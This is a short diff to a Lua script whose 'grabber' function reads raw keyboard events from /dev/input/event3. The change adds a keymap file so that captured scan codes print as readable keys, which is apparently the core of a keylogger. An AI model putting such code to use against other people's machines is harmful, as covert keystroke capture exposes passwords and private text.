@@ -14,6 +14,15 @@ function conv(str)
 end
 
 function grabber()
+
+	key = {}
+	local map = io.open("maps/en_GB.map","r")
+	l = map:read("*l")
+	while l ~= nil do
+		table.insert(key,l)
+		l = map:read("*l")
+	end
+	
 	local file = io.open("/dev/input/event3", "rb")
 
 	if not file then
@@ -33,7 +42,7 @@ function grabber()
 		value = conv(value)
 		
 		if ktype == 4 and kcode == 4 then
-			print(value)
+			print(key[value])
 		end
 	end
 end
